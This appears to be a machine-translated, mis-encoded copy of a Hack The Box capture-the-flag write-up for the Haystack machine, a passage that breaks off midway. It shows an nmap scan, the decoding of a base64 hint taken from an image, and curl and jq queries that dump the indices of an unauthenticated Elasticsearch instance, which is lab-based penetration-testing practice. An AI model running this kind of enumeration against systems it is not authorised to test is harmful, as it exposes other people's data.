<html>
<head>
<title>HacktheBox â€” Haystack</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">hack the boxâ€”â€”å¹²è‰å †</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/hackthebox-haystack-db3682804890?source=collection_archive---------0-----------------------#2019-11-02">https://infosecwriteups.com/hackthebox-haystack-db3682804890?source=collection_archive---------0-----------------------#2019-11-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/658b50b89a98f09c1bc11d3f1dfc0650.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/format:webp/1*a0mOlwfLuZFmD5V78z7VtQ.png"/></div><figcaption class="ju jv gj gh gi jw jx bd b be z dk translated"><a class="ae jy" href="https://www.hackthebox.eu/home/machines/profile/195" rel="noopener ugc nofollow" target="_blank"> hackthebox.eu </a></figcaption></figure><p id="dec0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¿™æ˜¯ä¸€ç¯‡å…³äºæˆ‘å¦‚ä½•è§£å†³HacktheBoxä¸­çš„Haystackçš„æ–‡ç« ã€‚</p><p id="49a9" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated"><a class="ae jy" href="http://hackthebox.eu" rel="noopener ugc nofollow" target="_blank"> Hack the Box </a>æ˜¯ä¸€ä¸ªåœ¨çº¿å¹³å°ï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œç»ƒä¹ æ¸—é€æµ‹è¯•æŠ€èƒ½ã€‚</p><p id="4c96" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œæˆ‘è¯•å›¾è§£é‡Šæˆ‘æ˜¯å¦‚ä½•ä»æœºå™¨ä¸Šç†è§£è¿™äº›æ¦‚å¿µçš„ï¼Œå› ä¸ºæˆ‘æƒ³çœŸæ­£ç†è§£äº‹ç‰©æ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚æ‰€ä»¥è¯·ï¼Œå¦‚æœæˆ‘è¯¯è§£äº†ä¸€ä¸ªæ¦‚å¿µï¼Œè¯·è®©æˆ‘çŸ¥é“ã€‚</p><h1 id="64c4" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">å…³äºç›’å­:</h1><p id="738a" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">è¿™ä¸ªç›’å­å› ä¸ºå®ƒçš„ç¬¬ä¸€æ­¥è€Œå—åˆ°å¾ˆå¤šäººçš„è®¨åŒã€‚å®ƒä»å›¾ç‰‡ä¸­çš„ä¸€ä¸ªbase64å­—ç¬¦ä¸²å¼€å§‹ï¼Œæ‚¨å°†åœ¨æ•°æ®çš„â€œå¹²è‰å †â€ä¸­å¯»æ‰¾å®ƒã€‚ä¹‹åï¼Œæ‚¨å°†åœ¨æ¡†ä¸­è·å¾—SSHçš„å‡­è¯ã€‚ç„¶åï¼Œæ‚¨å¿…é¡»åˆ©ç”¨Kibanaä¸­çš„LFIæ¼æ´ï¼Œç„¶ååˆ›å»ºä¸€ä¸ªå°†è¢«Logstashæ¥æ”¶çš„æ–‡ä»¶ï¼Œä»è€Œä»¥æ ¹ç”¨æˆ·èº«ä»½æ‰§è¡Œä»£ç ã€‚</p><h1 id="fdf8" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">ä¾¦å¯Ÿ:</h1><p id="8513" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">æˆ‘é¦–å…ˆé€šè¿‡è°ƒç”¨å‘½ä»¤è¿è¡Œåˆå§‹nmapæ‰«æï¼Œå°†å…¶ä¿å­˜åˆ°æˆ‘çš„nmapç›®å½•ä¸­</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="d5bb" class="mj ky iq mf b gy mk ml l mm mn">nmap -sV -sC -oA nmap/initial 10.10.10.115</span></pre><p id="786a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç»“æœæ˜¯:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="9804" class="mj ky iq mf b gy mk ml l mm mn">Nmap scan report for 10.10.10.115<br/>Host is up (0.72s latency).<br/>Not shown: 997 filtered ports<br/>PORT     STATE SERVICE VERSION<br/>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br/>| ssh-hostkey: <br/>|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)<br/>|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)<br/>|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)<br/>80/tcp   open  http    nginx 1.12.2<br/>|_http-server-header: nginx/1.12.2<br/>|_http-title: Site doesn't have a title (text/html).<br/>9200/tcp open  http    nginx 1.12.2<br/>| http-methods: <br/>|_  Potentially risky methods: DELETE<br/>|_http-server-header: nginx/1.12.2<br/>|_http-title: Site doesn't have a title (application/json; charset=UTF-8).</span><span id="3b06" class="mj ky iq mf b gy mo ml l mm mn">Service detection performed. Please report any incorrect results at <a class="ae jy" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> .<br/># Nmap done at Mon Jul  1 12:51:10 2019 -- 1 IP address (1 host up) scanned in 119.98 seconds</span></pre><p id="2629" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ³¨æ„ï¼Œæ ¹æ®æˆ‘çš„åˆå§‹æ‰«æï¼Œç«¯å£22(ssh)ã€ç«¯å£80(ä½¿ç”¨nginxçš„http)å’Œç«¯å£9200æ˜¯æ‰“å¼€çš„ã€‚ç«¯å£80å’Œç«¯å£9200ä¸Šè¿è¡Œçš„nginxç‰ˆæœ¬æ˜¯ç›¸åŒçš„ã€‚</p><h2 id="07a6" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">ç«¯å£80</h2><p id="c423" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">æ£€æŸ¥ç«¯å£80ï¼Œæˆ‘å¾—åˆ°çš„æ˜¯è¿™ä¸ª:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi na"><img src="../Images/5b6510541c65af6bd857c6c4e6799fb7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rsbPfKUzBTeNmBtNKy_qlQ.png"/></div></div></figure><p id="4107" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¿™æ˜¯å¤§æµ·æé’ˆçš„å½¢è±¡ã€‚ç„¶åæˆ‘æ£€æŸ¥é¡µé¢æºä»£ç :</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/ef851a00f44fe480efc22404b86d93ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1098/format:webp/1*3takORasV262JGgoZaMUvA.png"/></div></figure><p id="863b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ‰€ä»¥é¡µé¢åªæœ‰å›¾ç‰‡ã€‚æˆ‘ä¸‹è½½å®ƒå¹¶ä½¿ç”¨exiftoolæ£€æŸ¥å®ƒ:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi ng"><img src="../Images/ef66ce11c6a8688ab91e2f7948279fce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lI-8XzVg8VCwFrJID6TQfg.png"/></div></div></figure><p id="840a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘è¿˜å¯¹æ–‡ä»¶è¿è¡Œäº†å­—ç¬¦ä¸²ï¼Œå¹¶åœ¨æœ€åå‘ç°äº†ä¸€ä¸ªbase64ç¼–ç çš„å­—ç¬¦ä¸²:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi nh"><img src="../Images/fcbaad157bf5f61731e6386dfc6ca902.png" data-original-src="https://miro.medium.com/v2/resize:fit:966/format:webp/1*6nipoa1j3pkWwadUjhRy7g.png"/></div></figure><p id="0b4b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘é€šè¿‡è°ƒç”¨ä»¥ä¸‹å‘½ä»¤å¯¹å…¶è¿›è¡Œè§£ç :</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="05eb" class="mj ky iq mf b gy mk ml l mm mn">echo -n bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==|base64 -d</span></pre><p id="b730" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¾“å‡ºæ˜¯:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="2b9d" class="mj ky iq mf b gy mk ml l mm mn">la aguja en el pajar es "clave"</span></pre><p id="8ceb" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç”±äºå®ƒçœ‹èµ·æ¥åƒè¥¿ç­ç‰™è¯­ï¼Œæˆ‘å¾ˆå¿«å°±æŠŠå®ƒæ‰”ç»™è°·æ­Œç¿»è¯‘:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/f8287ec61468fedb4e5ba8dcbd7b6ee6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1272/format:webp/1*z0zRiFnGxNQoSlcrxm2-Qg.png"/></div></figure><p id="cca5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ³¨æ„ï¼Œè¿™ä¸ªé”®æ”¾åœ¨å¼•å·ä¸­ï¼Œå®ƒåœ¨è¥¿ç­ç‰™è¯­ä¸­çš„å¯¹åº”è¯æ˜¯â€œclaveâ€ã€‚</p><h2 id="0a2a" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">ç«¯å£9200</h2><p id="5cc8" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">æ£€æŸ¥ç«¯å£9200:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi nj"><img src="../Images/1deeac30fa008fb20ee54e825ba1a10a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z0WbfBuvFFH7o8pm_PvWHQ.png"/></div></div></figure><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi nk"><img src="../Images/90c3e2cf0f9225e5712a89d5d515cd4a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EL8y-Pqp8gLX9I1LniRE3A.png"/></div></div></figure><p id="da97" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">å®ƒçš„å¼¹æ€§æœç´¢ã€‚é€šè¯»å®ƒçš„<a class="ae jy" href="https://www.elastic.co/guide/en/elasticsearch/reference/current/targz.html" rel="noopener ugc nofollow" target="_blank">æ–‡æ¡£</a>ï¼Œå‘ç°é»˜è®¤æƒ…å†µä¸‹å®ƒç›‘å¬ç«¯å£9200(ç”¨äºä¼‘æ¯)ã€‚å®ƒè¿˜å¯ä»¥åœ¨ç«¯å£9300ä¸Šä¾¦å¬èŠ‚ç‚¹é€šä¿¡ã€‚æ ¹æ®æ–‡ä»¶:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e174" class="mj ky iq mf b gy mk ml l mm mn">The <strong class="mf ir">Elasticsearch</strong> REST APIs are exposed using <a class="ae jy" href="https://www.elastic.co/guide/en/elasticsearch/reference/current/modules-http.html" rel="noopener ugc nofollow" target="_blank">JSON over HTTP</a>.</span></pre><h2 id="ffcc" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">åˆ—è¡¨ç´¢å¼•:</h2><p id="50c7" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">æˆ‘é¦–å…ˆå¼€å§‹åˆ—å‡ºæŒ‡æ•°:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="006f" class="mj ky iq mf b gy mk ml l mm mn">curl <a class="ae jy" href="http://10.10.10.115:9200/_cat/indices?v" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/_cat/indices?v</a></span></pre><p id="39e0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¿™å°†è¿”å›é›†ç¾¤ä¸­ç´¢å¼•çš„é«˜çº§ä¿¡æ¯ã€‚</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/adc3ed29f6d14be0b58a1f26bb13a69f.png" data-original-src="https://miro.medium.com/v2/resize:fit:894/format:webp/1*NIuInTWEVBNyy4yhDHd-AQ.png"/></div></figure><p id="4b59" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æœ‰3ä¸ªç´¢å¼•:ã€‚kibana(é»˜è®¤)ã€æŠ¥ä»·å’Œé“¶è¡Œã€‚</p><p id="93bd" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç„¶åï¼Œæˆ‘å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ ¼å¼åœ¨ç´¢å¼•ä¸Šè¿è¡Œæœç´¢:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="2067" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/bank/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/&lt;index&gt;/_search</a></span></pre><p id="15bd" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç„¶åæˆ‘åœ¨é“¶è¡Œç´¢å¼•ä¸ŠæŸ¥äº†ä¸€ä¸‹:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="2b56" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/bank/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/bank/_search</a></span></pre><p id="647a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¿™ä¼šè¿”å›å¤§é‡çš„JSONæ•°æ®:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="5342" class="mj ky iq mf b gy mk ml l mm mn">"took":2,"timed_out":false,"_shards":{"total":5,"successful":5,"skipped":0,"failed":0},"hits":{"total":1000,"max_score":1.0,"hits":[{"_index":"bank","_type":"account","_id":"25","_score":1.0,"_source":{"account_number":25,"balance":40540,"firstname":"Virginia","lastname":"Ayala","age":39,"gender":"F","address":"171 Putnam Avenue","employer":"Filodyne","email":"<a class="ae jy" href="mailto:virginiaayala@filodyne.com" rel="noopener ugc nofollow" target="_blank">virginiaayala@filodyne.com</a>","city":"Nicholson","state":"PA"}},{"_index":"bank","_type":"account","_id":"44","_score":1.0,"_source":{"account_number":44,"balance":34487,"firstname":"Aurelia","lastname":"Harding","age":37,"gender":"M","address":"502 Baycliff Terrace","employer":"Orbalix","email":"<a class="ae jy" href="mailto:aureliaharding@orbalix.com" rel="noopener ugc nofollow" target="_blank">aureliaharding@orbalix.com</a>","city":"Yardville","state":"DE"}},{"_index":"bank","_type":"account","_id":"99","_score":1.0,"_source":{"account_number":99,"balance":47159,"firstname":"Ratliff","lastname":"Heath","age":39,"gender":"F","address":"806 Rockwell Place","employer":"Zappix","email":"<a class="ae jy" href="mailto:ratliffheath@zappix.com" rel="noopener ugc nofollow" target="_blank">ratliffheath@zappix.com</a>","city":"Shaft","state":"ND"}},{"_index":"bank","_type":"account","_id":"119","_score":1.0,"_source":{"account_number":119,"balance":49222,"firstname":"Laverne","lastname":"Johnson","age":28,"gender":"F","address":"302 Howard Place","employer":"Senmei","email":"<a class="ae jy" href="mailto:lavernejohnson@senmei.com" rel="noopener ugc nofollow" target="_blank">lavernejohnson@senmei.com</a>","city":"Herlong","state":"DC"}},{"_index":"bank","_type":"account","_id":"126","_score":1.0,"_source":{"account_number":126,"balance":3607,"firstname":"Effie","lastname":"Gates","age":39,"gender":"F","address":"620 National Drive","employer":"Digitalus","email":"<a class="ae jy" href="mailto:effiegates@digitalus.com" rel="noopener ugc nofollow" target="_blank">effiegates@digitalus.com</a>","city":"Blodgett","state":"MD"}},{"_index":"bank","_type":"account","_id":"145","_score":1.0,"_source":{"account_number":145,"balance":47406,"firstname":"Rowena","lastname":"Wilkinson","age":32,"gender":"M","address":"891 Elton Street","employer":"Asimiline","email":"<a class="ae jy" href="mailto:rowenawilkinson@asimiline.com" rel="noopener ugc nofollow" target="_blank">rowenawilkinson@asimiline.com</a>","city":"Ripley","state":"NH"}},{"_index":"bank","_type":"account","_id":"183","_score":1.0,"_source":{"account_number":183,"balance":14223,"firstname":"Hudson","lastname":"English","age":26,"gender":"F","address":"823 Herkimer Place","employer":"Xinware","email":"<a class="ae jy" href="mailto:hudsonenglish@xinware.com" rel="noopener ugc nofollow" target="_blank">hudsonenglish@xinware.com</a>","city":"Robbins","state":"ND"}},{"_index":"bank","_type":"account","_id":"190","_score":1.0,"_source":{"account_number":190,"balance":3150,"firstname":"Blake","lastname":"Davidson","age":30,"gender":"F","address":"636 Diamond Street","employer":"Quantasis","email":"<a class="ae jy" href="mailto:blakedavidson@quantasis.com" rel="noopener ugc nofollow" target="_blank">blakedavidson@quantasis.com</a>","city":"Crumpler","state":"KY"}},{"_index":"bank","_type":"account","_id":"208","_score":1.0,"_source":{"account_number":208,"balance":40760,"firstname":"Garcia","lastname":"Hess","age":26,"gender":"F","address":"810 Nostrand Avenue","employer":"Quiltigen","email":"<a class="ae jy" href="mailto:garciahess@quiltigen.com" rel="noopener ugc nofollow" target="_blank">garciahess@quiltigen.com</a>","city":"Brooktrails","state":"GA"}},{"_index":"bank","_type":"account","_id":"222","_score":1.0,"_source":{"account_number":222,"balance":14764,"firstname":"Rachelle","lastname":"Rice","age":36,"gender":"M","address":"333 Narrows Avenue","employer":"Enaut","email":"<a class="ae jy" href="mailto:rachellerice@enaut.com" rel="noopener ugc nofollow" target="_blank">rachellerice@enaut.com</a>","city":"Wright","state":"AZ"}}]}}</span></pre><p id="c4b4" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç„¶åï¼Œæˆ‘å¯ä»¥å°†å®ƒä¼ è¾“åˆ°jqå¹¶è¿‡æ»¤å‰30ä¸ªç»“æœ:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="4775" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/bank/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/bank/_search</a> | jq . | head -n 30</span></pre><p id="2c88" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¾“å‡ºæ˜¯:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/01a8b800ca855be23f2d2e1a00aa689a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1076/format:webp/1*CV0-4t3utVrL1Uoht0mrnw.png"/></div></figure><p id="4fd5" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">å› ä¸ºå®ƒçš„JSONï¼Œå®ƒæ˜¯ä¸€ä¸ªåç§°å€¼å¯¹ã€‚ç„¶åæˆ‘å¯ä»¥ä½¿ç”¨jqæŸ¥è¯¢è¿›è¡Œè¿‡æ»¤ã€‚æˆ‘å°†å°è¯•åˆ—å‡ºæ‰€æœ‰å¸¦æœ‰balanceåç§°çš„å€¼ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="4586" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/bank/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/bank/_search</a> | jq -r '.hits | .hits | .[] | ._source | .balance'</span></pre><p id="8603" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ä¸Šé¢çš„å‘½ä»¤å°†<em class="nn"> _search </em>å¯»æ‰¾ç´¢å¼•<em class="nn"> bankï¼Œ</em>å°†å…¶ä¼ é€åˆ°æ¥è‡ªjqçš„æŸ¥è¯¢ï¼Œè¯¥æŸ¥è¯¢åœ¨åç§°<em class="nn"> hits </em>ä¸­æŸ¥æ‰¾å€¼ï¼Œç„¶åå†æ¬¡æœç´¢<em class="nn"> hits </em>ä¸­çš„å€¼(å…¶å€¼æ˜¯æ•°ç»„<em class="nn">)ã€‚[] </em>)ï¼Œå¹¶åœ¨åç§°<em class="nn"> _source </em>ä¸­æŸ¥æ‰¾è¯¥å€¼ã€‚æˆ‘è¿™æ ·åšæ˜¯ä¸ºäº†ç»ƒä¹ jqğŸ˜‚</p><p id="0653" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘å¾—åˆ°è¿™æ ·çš„è¾“å‡º:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="04d6" class="mj ky iq mf b gy mk ml l mm mn">40540<br/>34487<br/>47159<br/>49222<br/>3607<br/>47406<br/>14223<br/>3150<br/>40760<br/>14764</span></pre><p id="9b31" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç”±äºæŒ‡æ•°é“¶è¡Œä¸­æ²¡æœ‰ä»€ä¹ˆæœ‰è¶£çš„ä¸œè¥¿ï¼Œæˆ‘è½¬åˆ°äº†æŠ¥ä»·ã€‚</p><h2 id="3295" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">å¼•ç”¨</h2><p id="6355" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">æ£€æŸ¥å‰20è¡Œ:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="4f42" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/quotes/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/quotes/_search</a> | jq . | head -n 20</span></pre><p id="2ff3" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¾“å‡ºæ˜¯:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="defc" class="mj ky iq mf b gy mk ml l mm mn">{<br/>  "took": 1,<br/>  "timed_out": false,<br/>  "_shards": {<br/>    "total": 5,<br/>    "successful": 5,<br/>    "skipped": 0,<br/>    "failed": 0<br/>  },<br/>  "hits": {<br/>    "total": 253,<br/>    "max_score": 1,<br/>    "hits": [<br/>      {<br/>        "_index": "quotes",<br/>        "_type": "quote",<br/>        "_id": "14",<br/>        "_score": 1,<br/>        "_source": {<br/>          "quote": "En AmÃ©rica se desarrollaron importantes civilizaciones, como Caral</span></pre><p id="ff3b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç”±äºç»“æ„æ˜¯hits â†’ hits â†’ _source â†’ quoteï¼Œæˆ‘å¯ä»¥è°ƒç”¨ä¸‹é¢çš„å‘½ä»¤æ¥è·å–quoteå­—æ®µï¼Œè·å–å‰20è¡Œï¼Œå¹¶å†æ¬¡é€šè¿‡ç®¡é“å°†å®ƒä¼ é€’ç»™jq(å› ä¸ºå¦‚æœå°†jqçš„è¾“å‡ºä¼ é€’ç»™bashå‘½ä»¤ï¼Œå®ƒä¼šä¸¢å¤±å…¶æ ¼å¼):</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="2c0b" class="mj ky iq mf b gy mk ml l mm mn">curl -X POST <a class="ae jy" href="http://10.10.10.115:9200/quotes/_search" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/quotes/_search</a> | jq -r '.hits | .hits |.[] | ._source ' | head -n 20 | jq .</span></pre><p id="8158" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¾“å‡ºæ˜¯:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="a323" class="mj ky iq mf b gy mk ml l mm mn">{<br/>  "quote": "En AmÃ©rica se desarrollaron importantes civilizaciones, como Caral (la civilizaciÃ³n mÃ¡s antigua de AmÃ©rica, la cual se desarrollÃ³ en la zona central de PerÃº), los anasazi, los indios pueblo, quimbaya, nazca, chimÃº, chavÃ­n, paracas, moche, huari, lima, zapoteca, mixteca, totonaca, tolteca, olmeca y chibcha, y las avanzadas civilizaciones correspondientes a los imperios de Teotihuacan, Tiahuanaco, maya, azteca e inca, entre muchos otros."<br/>}<br/>{<br/>  "quote": "Imperios espaÃ±ol y portuguÃ©s en 1790."<br/>}<br/>{<br/>  "quote": "TambiÃ©n se instalaron en AmÃ©rica del Sur repÃºblicas de pueblos de origen africano que lograron huir de la esclavitud a la que habÃ­an sido reducidos por los portugueses, como el Quilombo de los Palmares o el Quilombo de Macaco."<br/>}<br/>{<br/>  "quote": "En 1804, los esclavos de origen africano de HaitÃ­ se sublevaron contra los colonos franceses, declarando la independencia de este paÃ­s y creando el primer estado moderno con gobernantes afroamericanos."<br/>}<br/>{<br/>  "quote": "A partir de 1809,23â€‹ los pueblos bajo dominio de EspaÃ±a llevaron adelante una Guerra de Independencia Hispanoamericana, de alcance continental, que llevÃ³, luego de complejos procesos, al surgimiento de varias naciones: Argentina, Bolivia, Colombia, Costa Rica, PanamÃ¡, Chile, Ecuador, El Salvador, Guatemala, Honduras, MÃ©xico, Nicaragua, Paraguay, PerÃº, Uruguay y Venezuela. En 1844 y 1898 el proceso se completarÃ­a con la independencia de RepÃºblica Dominicana y Cuba, respectivamente."<br/>}<br/>{<br/>  "quote": "En 1816, se conformÃ³ un enorme estado independiente sudamericano, denominado Gran Colombia, y que abarcÃ³ los territorios de los actuales PanamÃ¡, Colombia, Venezuela y Ecuador y zonas de Brasil, Costa Rica, Guyana, Honduras, Nicaragua y PerÃº. La RepÃºblica se disolviÃ³ en 1830."<br/>}</span></pre><p id="1467" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘å¾—åˆ°äº†ä¸€å †å¼•ç”¨ã€‚å¦‚æœæˆ‘ç¿»è¯‘ä¸€æ®µè¾ƒçŸ­çš„å¼•è¨€:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi no"><img src="../Images/2e8e34b0f852a4943fdd1910ee6d8e2a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1260/format:webp/1*T398baJV-4uNTkHjHiGtAQ.png"/></div></figure><p id="ad74" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ã€‚å®ƒä»¬åªæ˜¯ä¸€å 